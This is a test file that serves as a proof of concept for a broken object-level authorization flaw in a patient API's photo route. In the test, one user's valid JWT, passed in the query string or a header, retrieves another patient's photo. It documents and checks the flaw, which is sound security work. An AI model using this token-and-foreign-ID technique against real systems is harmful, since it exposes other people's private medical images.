import { describe, it, expect, beforeEach } from 'vitest';
import { api, resetDb, createUser, authHeader } from './helpers';
import { prisma } from '../src/prisma';
import { writeFileSync, unlinkSync, existsSync } from 'node:fs';

// BOLA PoC 3 — GET /api/patients/:id/photo?t=<any-valid-jwt> (app.ts:297 + requirePhotoToken)
// requirePhotoToken only verifies JWT signature/expiry — no subject binding. The route then
// serves the photo of ANY patient id. storage is mocked to resolve {kind:'file',file:'test.jpg'},
// and the route does fs.existsSync('test.jpg') (CWD-relative) — creating ./test.jpg makes
// res.sendFile reachable so the cross-tenant read is observable end-to-end.
describe('BOLA: GET /api/patients/:id/photo aceita token de outro usuário', () => {
  beforeEach(async () => {
    await resetDb();
  });

  it('user B\'s JWT serves user A\'s patient photo bytes (200)', async () => {
    if (!existsSync('test.jpg')) writeFileSync('test.jpg', 'FAKE-JPEG-BYTES-POC');
    try {
      const victim = await createUser({ name: 'Vítima Foto' });
      await prisma.patient.update({
        where: { id: victim.patient.id },
        data: { photoUrl: 's3://bucket/patient-victim.jpg' },
      });
      const attacker = await createUser({ name: 'Atacante Foto' });

      // No token at all → 401.
      const anon = await api().get(`/api/patients/${victim.patient.id}/photo`);
      expect(anon.status).toBe(401);

      // ATTACK: B's own valid JWT + A's patient CUID via ?t=.
      const r = await api()
        .get(`/api/patients/${victim.patient.id}/photo?t=${attacker.token}`);
      expect(r.status).toBe(200);
      expect(r.headers['content-type']).toMatch(/image\/jpeg/);
      expect(r.text).toContain('FAKE-JPEG-BYTES-POC');

      // Same weak-token check via header (Bearer) also passes for a foreign patient.
      const hdr = await api()
        .get(`/api/patients/${victim.patient.id}/photo`)
        .set(authHeader(attacker.token));
      expect(hdr.status).toBe(200);

      // Nonexistent patient → 404 (proves routing/DB path exercised, not a blanket 200).
      const nf = await api()
        .get(`/api/patients/clxxxnonexistent/photo?t=${attacker.token}`);
      expect(nf.status).toBe(404);
    } finally {
      if (existsSync('test.jpg')) unlinkSync('test.jpg');
    }
  });
});